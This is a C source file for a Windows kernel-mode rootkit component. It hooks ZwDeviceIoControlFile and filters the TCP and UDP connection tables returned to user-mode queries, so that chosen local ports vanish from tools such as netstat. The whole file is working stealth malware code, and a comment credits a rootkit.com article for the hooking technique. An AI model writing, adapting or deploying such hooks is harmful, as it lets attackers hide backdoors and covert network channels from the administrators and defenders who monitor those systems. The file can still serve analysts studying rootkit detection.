#include <ntddk.h>
#include "port.h"

typedef unsigned char BYTE, *PBYTE;

USHORT TcpPortToHide[1024];
ULONG NbTcpPortToHide=0;   
USHORT UdpPortToHide[1024];
ULONG NbUdpPortToHide=0;

/*
    ZwDeviceIoControlFile hook inspired of jiurl article:
    http://www.rootkit.com/newsread.php?newsid=103
*/

ZWDEVICEIOCONTROLFILE ZwDeviceIoControlFileAddress = NULL;
ULONG NumberOfCalls=0;

NTSTATUS ZwDeviceIoControlFileHook(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,
    OUT PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputBufferLength
)
{
    NTSTATUS status;
    PTDIObjectID Request;
    ULONG NumberOfConnections;
    PTCPAddrEntry TcpTable;
	PTCPAddrExEntry	TcpExTable;
	PUDPAddrEntry UdpTable;
	PUDPAddrExEntry UdpExTable;
	ULONG i, j;
	PBYTE udp;
    
    NumberOfCalls++;
    
    status = ZwDeviceIoControlFileAddress(
       FileHandle,
       Event,
       ApcRoutine,
       ApcContext,
       IoStatusBlock,
       IoControlCode,
       InputBuffer OPTIONAL,
       InputBufferLength,
       OutputBuffer OPTIONAL,
       OutputBufferLength);    
    
    if( !NT_SUCCESS(status) ) 
       return status;
      
    if( IoControlCode != IOCTL_TCP_QUERY_INFORMATION_EX ) 
       // not an interesting request
       return status;

    udp = (PBYTE)InputBuffer;
    Request = (PTDIObjectID)InputBuffer;
    
    if( *udp == 0 ) {
       // that's a TCP request !
       if( Request->toi_entity.tei_entity == CO_TL_ENTITY   &&
		   Request->toi_entity.tei_instance == 0            &&
		   Request->toi_class == INFO_CLASS_PROTOCOL        &&
		   Request->toi_type == INFO_TYPE_PROVIDER)
      {
         if( Request->toi_id == TCP_MIB_ADDRTABLE_ENTRY_ID ) {
            NumberOfConnections  = IoStatusBlock->Information/sizeof(TCPAddrEntry);
		    TcpTable = (PTCPAddrEntry)OutputBuffer;    
		   
		    for( i=0; i<NbTcpPortToHide; i++ ) {
               for( j=0; j<NumberOfConnections; j++ ) {     
                  if(TcpPortToHide[i] == ntohs(TcpTable[j].localPort)) {           
                    
                    // port to hide from TCP table
                    // we gap all the tables towards the beginning
                    
                    memcpy( TcpTable+j,           
                            TcpTable+j+1,        
                            (NumberOfConnections-j-1)*sizeof(TCPAddrEntry)); 

                    
                    NumberOfConnections--; // now we've got 1 struct less
                    j--;          // next struct is now on TcpTable+j; 
                    
                    IoStatusBlock->Information -= sizeof(TCPAddrEntry);                                                                
                  }                  
               }  
            }
         }  // if TCP_MIB_ADDRTABLE_ENTRY_ID
        
         if( Request->toi_id == TCP_MIB_ADDRTABLE_ENTRY_EX_ID ) {
            NumberOfConnections  = IoStatusBlock->Information/sizeof(TCPAddrExEntry);
		    TcpExTable = (PTCPAddrExEntry)OutputBuffer;    
		   
		    for( i=0; i<NbTcpPortToHide; i++ ) {
               for( j=0; j<NumberOfConnections; j++ ) {     
                  if(TcpPortToHide[i] == ntohs(TcpExTable[j].localPort)) {           
                    
                    memcpy( TcpExTable+j,           
                            TcpExTable+j+1,         
                            (NumberOfConnections-j-1)*sizeof(TCPAddrExEntry) );
                    
                    NumberOfConnections--; 
                    j--;                
                  
                    IoStatusBlock->Information -= sizeof(TCPAddrExEntry);  
                             
                  }                  
               }  
            }
         }  // if TCP_MIB_ADDRTABLE_ENTRY_EX_ID
      }      
    }  // if !udp  
    else {
       // requete UDP     
         
       if( Request->toi_id == TCP_MIB_ADDRTABLE_ENTRY_ID ) {
          NumberOfConnections  = IoStatusBlock->Information/sizeof(UDPAddrEntry);
          UdpTable = (PUDPAddrEntry)OutputBuffer;
          
          for( i=0; i<NbUdpPortToHide; i++ ) {
             for( j=0; j<NumberOfConnections; j++ ) {     
                if(UdpPortToHide[i] == ntohs(UdpTable[j].localPort)) {           
                    
                    memcpy( UdpTable+j,           
                            UdpTable+j+1,         
                            (NumberOfConnections-j-1)*sizeof(UDPAddrEntry));
                    
                    NumberOfConnections--; 
                    j--;               
                    IoStatusBlock->Information -= sizeof(UDPAddrEntry);      
                                                        
                }                  
             }  
          }      
       } // if UDP_MIB_ADDRTABLE_ENTRY_ID
       
       if( Request->toi_id == UDP_MIB_ADDRTABLE_ENTRY_EX_ID ) {
          NumberOfConnections  = IoStatusBlock->Information/sizeof(UDPAddrExEntry);
          UdpExTable = (PUDPAddrExEntry)OutputBuffer;    
		   
	      for( i=0; i<NbUdpPortToHide; i++ ) {
             for( j=0; j<NumberOfConnections; j++ ) {     
                if(UdpPortToHide[i] == ntohs(UdpExTable[j].localPort)) {          
                                  
                   memcpy( UdpExTable+j,           
                           UdpExTable+j+1,        
                           (NumberOfConnections-j-1)*sizeof(UDPAddrExEntry));
                    
                   NumberOfConnections--; 
                   j--;       
                   IoStatusBlock->Information -= sizeof(UDPAddrExEntry); 
                          
                }                  
             }  
          }    
       } // if UDP_MIB_ADDRTABLE_ENTRY_EX_ID 
    }
    return status;
}
